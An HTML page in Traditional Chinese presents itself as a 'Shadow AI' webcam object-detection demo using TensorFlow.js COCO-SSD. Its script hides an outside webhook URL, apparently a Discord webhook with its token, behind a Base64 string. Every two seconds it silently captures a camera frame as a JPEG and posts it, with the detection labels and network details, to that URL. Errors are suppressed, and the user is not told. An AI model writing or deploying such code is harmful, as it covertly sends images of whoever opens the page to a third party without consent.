<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow AI 辨識系統</title>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd"></script>
    <style>
        body { font-family: 'Inter', sans-serif; background: #0a0a0a; color: #00ff88; display: flex; flex-direction: column; align-items: center; margin: 0; overflow-x: hidden; }
        h2 { text-shadow: 0 0 10px #00ff88; margin: 20px 0; }
        .monitor-box { position: relative; width: 360px; height: 270px; border: 2px solid #00ff88; border-radius: 10px; overflow: hidden; background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; }
        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        .log-panel { width: 360px; background: rgba(0, 255, 136, 0.05); border: 1px solid #00ff88; border-radius: 8px; padding: 12px; margin-top: 15px; font-size: 14px; }
        .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: #ff0000; margin-right: 5px; }
        .active { background: #00ff88; box-shadow: 0 0 8px #00ff88; }
    </style>
</head>
<body>

    <h2>SHADOW AI MONITOR V1.0</h2>

    <div class="monitor-box">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <div class="log-panel">
        <div><span id="dot" class="status-dot"></span> 狀態: <span id="status">系統初始化...</span></div>
        <div id="objects">偵測物件: 等待模型中...</div>
        <div id="net">網路: 偵測中...</div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const statusText = document.getElementById('status');
        const objText = document.getElementById('objects');
        const dot = document.getElementById('dot');

        // Webhook Base64 處理
        const _k = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NjY5Mzc0MzU3NDA2MTI5MS9ySlNnMkgxZnFJRG1yQ2pyWmx6QmdIVEMzdEhvRDgySjctTFdBMDBxWlA3VTlYc1ZXSU1kMElYelhxOXlMc09NVHJ3";
        const getHook = () => atob(_k);

        let model;

        async function init() {
            try {
                // 1. 啟動相機
                statusText.innerText = "正在請求相機權限...";
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment", width: 640, height: 480 }, 
                    audio: false 
                });
                video.srcObject = stream;
                
                // 確保影片讀取後再執行後續動作
                video.onloadedmetadata = () => {
                    video.play();
                    dot.classList.add('active');
                    loadModel();
                };

            } catch (err) {
                statusText.innerText = "錯誤: 無法開啟相機 (" + err.name + ")";
                console.error(err);
            }
        }

        async function loadModel() {
            statusText.innerText = "載入 AI 模型 (COCO-SSD)...";
            model = await cocoSsd.load();
            statusText.innerText = "AI 運作中 - 同步已開啟";
            detect();
            setInterval(sync, 2000); // 每兩秒傳送一次
        }

        async function detect() {
            if (!model) return;

            const predictions = await model.detect(video);
            
            // 畫布尺寸與影片同步
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            let labels = [];

            predictions.forEach(p => {
                labels.push(`${p.class} [${Math.round(p.score * 100)}%]`);
                
                // 畫出綠色科技感框線
                ctx.strokeStyle = "#00ff88";
                ctx.lineWidth = 3;
                ctx.strokeRect(p.bbox[0], p.bbox[1], p.bbox[2], p.bbox[3]);

                // 畫標籤背景
                ctx.fillStyle = "#00ff88";
                ctx.font = "16px monospace";
                const txt = p.class;
                const width = ctx.measureText(txt).width;
                ctx.fillRect(p.bbox[0], p.bbox[1] - 20, width + 10, 20);

                ctx.fillStyle = "#000";
                ctx.fillText(txt, p.bbox[0] + 5, p.bbox[1] - 5);
            });

            objText.innerText = "偵測物件: " + (labels.length > 0 ? labels.join(", ") : "掃描中...");
            requestAnimationFrame(detect);
        }

        async function sync() {
            if (!model) return;

            const tempCanvas = document.createElement('canvas');
            tempCanvas.width = video.videoWidth;
            tempCanvas.height = video.videoHeight;
            tempCanvas.getContext('2d').drawImage(video, 0, 0);

            tempCanvas.toBlob(async (blob) => {
                const formData = new FormData();
                const conn = navigator.connection || {};
                
                const content = {
                    username: "Shadow AI Bot",
                    embeds: [{
                        title: "🟢 實時辨識同步數據",
                        color: 65416,
                        fields: [
                            { name: "偵測結果", value: objText.innerText, inline: false },
                            { name: "網路延遲", value: (conn.rtt || "N/A") + " ms", inline: true },
                            { name: "連線類型", value: conn.effectiveType || "N/A", inline: true }
                        ],
                        timestamp: new Date()
                    }]
                };

                formData.append('payload_json', JSON.stringify(content));
                formData.append('file', blob, 'sync_frame.jpg');

                try {
                    await fetch(getHook(), { method: 'POST', body: formData });
                } catch (e) { }
            }, 'image/jpeg', 0.5);
        }

        init();
    </script>
</body>
</html>
